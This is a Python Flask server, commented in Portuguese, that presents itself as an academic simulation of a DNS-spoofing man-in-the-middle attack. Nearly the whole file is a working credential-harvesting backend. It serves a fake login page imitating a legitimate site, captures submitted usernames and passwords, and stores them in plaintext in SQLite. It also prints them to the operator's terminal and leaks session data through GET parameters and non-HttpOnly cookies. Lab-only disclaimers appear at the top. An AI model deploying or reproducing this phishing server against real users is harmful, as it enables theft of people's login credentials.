#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
============================================================
 Simulação acadêmica de ataque MITM (DNS Spoofing)
 Uso exclusivo para fins educacionais em ambiente controlado.
============================================================

 Este servidor Flask simula a captura de credenciais durante
 um ataque Man-in-the-Middle com DNS Spoofing. Ele:
   1. Serve páginas HTML estáticas (login e home)
   2. Recebe dados de formulário via POST /login
   3. Armazena os dados em um banco SQLite local
   4. Exibe os dados capturados no terminal

 ATENÇÃO: Este código deve ser utilizado SOMENTE para fins
 acadêmicos em laboratórios controlados de Segurança da
 Informação. O uso indevido é proibido por lei.
============================================================

 Estrutura esperada do projeto:
   server.py          <- Este arquivo
   dados.db           <- Banco SQLite (criado automaticamente)
   /static
     index.html       <- Página de login
     home.html        <- Página pós-login
     styles.css       <- Estilos visuais
     script.js        <- Scripts do frontend
============================================================
"""

# ============================================================
# Importações
# ============================================================
from flask import Flask, request, redirect, send_from_directory, make_response, jsonify
import sqlite3
import os
import uuid
from datetime import datetime

# ============================================================
# Configuração do Flask
# ============================================================
# Cria a instância do Flask apontando a pasta 'static' como
# diretório de arquivos estáticos
app = Flask(__name__, static_folder='static')

# Caminho absoluto para o banco de dados SQLite
# O banco será criado no mesmo diretório do server.py
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
DATABASE = os.path.join(BASE_DIR, 'dados.db')


# ============================================================
# Inicialização do Banco de Dados
# ============================================================
def inicializar_banco():
    """
    Cria o banco de dados e a tabela 'logins' caso não existam.

    Tabela 'logins':
      - id:        Chave primária, auto-incremento
      - usuario:   Campo de texto para armazenar o login/e-mail
      - senha:     Campo de texto para armazenar a senha capturada
      - data_hora: Registro da data e hora da captura (timestamp)
    """
    conn = sqlite3.connect(DATABASE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS logins (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            usuario TEXT NOT NULL,
            senha TEXT NOT NULL,
            data_hora TEXT NOT NULL
        )
    ''')

    conn.commit()
    conn.close()
    print(f"[*] Banco de dados inicializado: {DATABASE}")


# ============================================================
# Rotas do Servidor
# ============================================================

@app.route('/')
def pagina_inicial():
    """
    Rota principal — serve o arquivo 'index.html' (página de login).
    Quando o usuário acessa o IP/domínio do servidor, ele vê
    a página falsa de login que imita o site legítimo.
    """
    return send_from_directory('static', 'index.html')


@app.route('/home.html')
def pagina_home():
    """
    Rota para a página home — serve o arquivo 'home.html'.
    Após o "login", o usuário é redirecionado para esta página
    que simula um painel autenticado.
    """
    return send_from_directory('static', 'home.html')


@app.route('/login', methods=['GET', 'POST'])
def capturar_login():
    """
    Endpoint de captura de credenciais.

    Funcionamento:
      1. Recebe os campos 'usuario' e 'senha' do formulário HTML
      2. Valida se os campos não estão vazios
      3. Registra a data e hora da captura
      4. Salva os dados no banco SQLite (tabela 'logins')
      5. Exibe os dados capturados no terminal do servidor
      6. Redireciona o usuário para a página '/home.html'

    Isso simula o que um atacante faria ao capturar credenciais
    de vítimas que acessaram o site falso via DNS Spoofing.
    """
    # Se acessar /login via GET (ex: botão voltar do navegador),
    # redireciona para a página de login
    if request.method == 'GET':
        return redirect('/')
    # Recebe os dados enviados pelo formulário HTML
    usuario = request.form.get('usuario', '').strip()
    senha = request.form.get('senha', '').strip()

    # Validação básica — verifica se os campos foram preenchidos
    if not usuario or not senha:
        print("[!] Tentativa de login com campos vazios — ignorando.")
        return redirect('/')

    # Registra o momento da captura
    data_hora = datetime.now().strftime('%d/%m/%Y %H:%M:%S')

    # -------------------------------------------------------
    # Exibe os dados capturados no terminal do servidor
    # Isso permite que o "atacante" veja em tempo real as
    # credenciais que estão sendo capturadas
    # -------------------------------------------------------
    print("=" * 50)
    print("  [CAPTURA DE CREDENCIAIS]")
    print("=" * 50)
    print(f"  Usuário:   {usuario}")
    print(f"  Senha:     {senha}")
    print(f"  Data/Hora: {data_hora}")
    print("=" * 50)

    # -------------------------------------------------------
    # Salva os dados no banco SQLite
    # -------------------------------------------------------
    try:
        conn = sqlite3.connect(DATABASE)
        cursor = conn.cursor()

        cursor.execute(
            'INSERT INTO logins (usuario, senha, data_hora) VALUES (?, ?, ?)',
            (usuario, senha, data_hora)
        )

        conn.commit()
        conn.close()
        print(f"[+] Dados salvos no banco de dados com sucesso!")
    except Exception as e:
        print(f"[!] Erro ao salvar no banco de dados: {e}")

    # -------------------------------------------------------
    # Gera um ID de sessão único e redireciona para a rota
    # GET /login/session para que cookies e session ID
    # fiquem visíveis no tráfego de rede (captura via GET)
    # -------------------------------------------------------
    session_id = str(uuid.uuid4())
    print(f"  Session ID: {session_id}")

    # Redireciona para a rota GET que vai setar os cookies
    return redirect(f'/login/session?sid={session_id}&user={usuario}')


# ============================================================
# Rota GET de Sessão — visível no tráfego de rede
# ============================================================
@app.route('/login/session', methods=['GET'])
def sessao_login():
    """
    Rota GET intermediária que:
      1. Recebe o session ID e usuário via query string (GET)
      2. Define cookies de sessão no navegador da vítima
      3. Redireciona para a página home

    Esta rota existe para que o session ID e os cookies
    sejam transmitidos via GET, ficando visíveis em
    ferramentas de captura de rede (Wireshark, tcpdump, etc.)
    """
    session_id = request.args.get('sid', str(uuid.uuid4()))
    usuario = request.args.get('user', 'desconhecido')
    login_time = datetime.now().strftime('%d/%m/%Y %H:%M:%S')

    print("=" * 50)
    print("  [SESSÃO CRIADA VIA GET]")
    print("=" * 50)
    print(f"  Session ID:  {session_id}")
    print(f"  Usuário:     {usuario}")
    print(f"  Data/Hora:   {login_time}")
    print("=" * 50)

    # Cria a resposta com redirect para home
    response = make_response(redirect('/home.html'))

    # Define cookies visíveis no tráfego de rede
    response.set_cookie('SESSIONID', session_id, max_age=3600, httponly=False)
    response.set_cookie('USER', usuario, max_age=3600, httponly=False)
    response.set_cookie('AUTH_TOKEN', str(uuid.uuid4()), max_age=3600, httponly=False)
    response.set_cookie('LOGIN_TIME', login_time, max_age=3600, httponly=False)

    return response


# ============================================================
# Rota GET para consultar dados da sessão (JSON)
# ============================================================
@app.route('/login/check', methods=['GET'])
def verificar_sessao():
    """
    Rota GET que retorna os dados da sessão como JSON.
    Útil para capturar cookies e session ID em ferramentas
    de análise de rede, pois toda a informação trafega via GET.
    """
    session_id = request.cookies.get('SESSIONID', 'nenhum')
    usuario = request.cookies.get('USER', 'nenhum')
    auth_token = request.cookies.get('AUTH_TOKEN', 'nenhum')
    login_time = request.cookies.get('LOGIN_TIME', 'nenhum')

    dados_sessao = {
        'autenticado': session_id != 'nenhum',
        'session_id': session_id,
        'usuario': usuario,
        'auth_token': auth_token,
        'login_time': login_time
    }

    print(f"[*] Consulta de sessão via GET: {dados_sessao}")
    return jsonify(dados_sessao)


# ============================================================
# Rota genérica para servir qualquer arquivo da pasta /static
# ============================================================
@app.route('/<path:filename>')
def servir_arquivo_estatico(filename):
    """
    Serve qualquer arquivo presente na pasta 'static'.
    Isso permite que CSS, JS e outros arquivos sejam carregados
    automaticamente pelo navegador ao acessar as páginas HTML.
    """
    return send_from_directory('static', filename)


# ============================================================
# Ponto de entrada — Execução do servidor
# ============================================================
if __name__ == '__main__':
    # Inicializa o banco de dados na primeira execução
    inicializar_banco()

    print()
    print("=" * 50)
    print("  SERVIDOR DE SIMULAÇÃO MITM ATIVO")
    print("=" * 50)
    print("  Host: 127.0.0.1 (somente local — Apache faz o proxy)")
    print("  Porta: 8080")
    print(f"  Banco de dados: {DATABASE}")
    print("  Aguardando conexões...")
    print("=" * 50)
    print()

    # Inicia o servidor Flask
    # - host='127.0.0.1': escuta somente local (Apache faz reverse proxy)
    # - port=8080: porta interna (Apache redireciona da porta 80)
    # - debug=False: desativa o modo debug em "produção"
    #
    # Para executar:
    #   python3 server.py
    app.run(host='127.0.0.1', port=8080, debug=False)
